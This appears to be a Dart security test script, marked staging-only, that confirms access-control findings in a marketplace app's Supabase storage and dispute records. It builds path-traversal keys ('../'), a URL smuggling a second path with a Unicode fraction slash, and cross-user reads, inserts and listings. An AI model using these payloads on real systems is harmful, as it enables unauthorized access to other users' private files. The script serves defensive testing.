/// Confirma HOLDs EB — sem corrigir. Staging only.
import 'dart:convert';
import 'dart:io';
import '_rteb.dart';

void main() async {
  final c = Rteb.fromEnv(loadEnv());
  await c.loginActors();
  await c.ensureBuyer2();
  await c.ensureSeller2();

  const oid = '30823788-8454-448c-916a-ee96efd78a9c';
  const did = '33f2a951-2e3b-424e-a74e-f8af0416ab66';
  const d2oid = '39e30076-976b-42bf-8d87-ccf762eaa631';
  const d2did = '6265ab2a-72e6-4077-9e88-0b7ddf546547';
  const c2oid = 'fad0005e-91fa-4c6f-9dfe-03dbbd32da2d';
  const alienOid = '00000000-0000-0000-0000-00000000eb02';
  final b1 = c.buyerId!;
  final b2 = c.buyer2Id!;

  Future<HttpHit> canon(String url) =>
      c.rpc('batata_storage_url_path_canonical', {'p_url': url}, service: true);
  Future<HttpHit> ok(String url, {String? buyer, String? order}) => c.rpc(
        'batata_dispute_proof_url_ok',
        {
          'p_url': url,
          'p_buyer': buyer ?? b1,
          'p_oid': order ?? oid,
        },
        service: true,
      );

  const frac = '\u2044';
  final mine =
      'https://fxdknzrqjenzqcvnwqqq.supabase.co/storage/v1/object/sign/fleaber_private/'
      'order_disputes/$b1/$oid/ok.png';
  final a2cUrl =
      '$mine${frac}order_disputes/$b2/$alienOid/rteb-secret.png';

  final out = <String, Object?>{};

  out['actors'] = {
    'b1': b1,
    'b2': b2,
    's2': c.seller2Id,
  };

  out['a2c_url'] = a2cUrl;
  out['a2c_canon'] = (await canon(a2cUrl)).body;
  out['a2c_proof_ok'] = (await ok(a2cUrl)).body;
  out['a2c_get_signed'] = (await c.storageGetSigned(a2cUrl)).brief;

  final a2cPatch = await c.patchDispute(did, {'return_label_url': a2cUrl});
  final a2cRow = await c.disputeRow(did);
  out['a2c_persist_label'] = {
    'hit': a2cPatch.brief,
    'stored': a2cRow?['return_label_url'],
    'kept_frac': '${a2cRow?['return_label_url']}'.contains(frac),
  };
  final a2cPhotos = await c.patchDispute(did, {
    'proof_photos': [a2cUrl],
  });
  final a2cRow2 = await c.disputeRow(did);
  out['a2c_persist_photos'] = {
    'hit': a2cPhotos.brief,
    'photos': a2cRow2?['proof_photos'],
    'kept_frac': '${a2cRow2?['proof_photos']}'.contains(frac),
  };

  // A2 literal ../ key
  const a2Key =
      'order_disputes/bfcbeeee-7dc1-4cd1-b2a7-d3a0a6cf7c96/../3ca2cf64-93d8-4b4b-be8f-9035b22e8a1a/rteb-enc.png';
  final a2GetB1 = await c.storageGet(a2Key, jwt: c.buyerJwt);
  final a2GetB2 = await c.storageGet(a2Key, jwt: c.buyer2Jwt);
  final a2GetNormB2 = await c.storageGet(
    'order_disputes/$b2/rteb-enc.png',
    jwt: c.buyerJwt,
  );
  final a2GetNormB2own = await c.storageGet(
    'order_disputes/$b2/rteb-enc.png',
    jwt: c.buyer2Jwt,
  );
  final a2Url =
      'https://fxdknzrqjenzqcvnwqqq.supabase.co/storage/v1/object/sign/fleaber_private/$a2Key';
  out['a2_literal_key'] = {
    'getB1': a2GetB1.brief,
    'getB2': a2GetB2.brief,
    'getNormB2asB1': a2GetNormB2.brief,
    'getNormB2asB2': a2GetNormB2own.brief,
    'proof_ok': (await ok(a2Url)).body,
    'canon': (await canon(a2Url)).body,
  };

  // A9: did ../ revoke touch B2 real object?
  final alienKey = 'order_disputes/$b2/$alienOid/rteb-secret.png';
  final a9GetB2 = await c.storageGet(alienKey, jwt: c.buyer2Jwt);
  final a9GetB1 = await c.storageGet(alienKey, jwt: c.buyerJwt);
  final travPath = 'order_disputes/$b1/../$b2/$alienOid/rteb-secret.png';
  final revTrav = await c.rest(
    'GET',
    'batata_private_object_revoked?object_path=eq.${Uri.encodeQueryComponent(travPath)}&select=*',
    service: true,
  );
  final revReal = await c.rest(
    'GET',
    'batata_private_object_revoked?object_path=eq.$alienKey&select=*',
    service: true,
  );
  final revLike = await c.rest(
    'GET',
    'batata_private_object_revoked?object_path=like.*$b2*&select=object_path,revoked_by,revoked_at',
    service: true,
  );
  final alienUrl =
      'https://fxdknzrqjenzqcvnwqqq.supabase.co/storage/v1/object/sign/fleaber_private/$alienKey';
  out['a9_revoke_dotdot'] = {
    'getB2own': a9GetB2.brief,
    'getB1alien': a9GetB1.brief,
    'rev_trav_path': revTrav.brief,
    'rev_real_path': revReal.brief,
    'rev_like_b2': {
      'status': revLike.status,
      'n': revLike.list.length,
      'paths': revLike.list
          .map((e) => e is Map ? e['object_path'] : e)
          .toList(),
    },
    'proof_ok_b2_as_b1': (await ok(alienUrl)).body,
    'proof_ok_b2_as_b2': (await ok(alienUrl, buyer: b2, order: alienOid)).body,
  };

  // B1 retest on dedicated paid order (c2oid) after enviado+concluido
  var b1row = await c.orderRow(c2oid);
  out['b1_c2_before'] = {
    'status': b1row?['status'],
    'buyer': b1row?['buyer_id'],
  };
  if (b1row?['status'] != 'enviado' && b1row?['status'] != 'concluido') {
    await c.toEnviado(c2oid);
  }
  b1row = await c.orderRow(c2oid);
  if (b1row?['status'] == 'enviado') {
    await c.toConcluido(c2oid);
  }
  final b1hit = await c.insertDispute(
    orderId: c2oid,
    jwt: c.buyer2Jwt,
    buyer: b2,
  );
  out['b1_retest_alien_order'] = {
    'hit': b1hit.brief,
    'id': b1hit.firstId,
    'status': (await c.orderRow(c2oid))?['status'],
  };

  // C3 list body
  final c3list = await c.storageList(
    prefix: 'order_disputes/$b1/',
    jwt: c.seller2Jwt,
  );
  out['c3_s2_list'] = {
    'status': c3list.status,
    'n': c3list.list.length,
    'snippet': clip(c3list.body, 200),
  };
  final c3row = await c.rest(
    'GET',
    'order_disputes?id=eq.$did&select=id,return_label_url,buyer_id',
    jwt: c.seller2Jwt,
  );
  out['c3_s2_row'] = c3row.brief;

  // D2 photos after revoke; D3 disputa with reup path
  out['d2_row'] = {
    'photos': (await c.disputeRow(d2did))?['proof_photos'],
    'status': (await c.disputeRow(d2did))?['status'],
  };
  final d3canon =
      'https://fxdknzrqjenzqcvnwqqq.supabase.co/storage/v1/object/sign/fleaber_private/'
      'order_disputes/$b1/$d2oid/reup.png';
  out['d3_proof_ok'] = (await ok(d3canon, order: d2oid)).body;
  final d3patch = await c.patchDispute(d2did, {
    'proof_photos': [d3canon],
  });
  out['d3_patch_reup'] = {
    'hit': d3patch.brief,
    'photos': (await c.disputeRow(d2did))?['proof_photos'],
    'kept_reup': '${(await c.disputeRow(d2did))?['proof_photos']}'.contains('reup.png'),
  };

  // JWT SELECT still deny
  out['a5_sel'] = (await c.revokedSelect(jwt: c.buyerJwt)).brief;
  out['a5_ins'] = (await c.revokedInsert(
    'order_disputes/$b2/x.png',
    jwt: c.buyerJwt,
  )).brief;

  await dumpJson('${outDir()}/confirm.json', out);
  stdout.writeln(const JsonEncoder.withIndent('  ').convert(out));
}
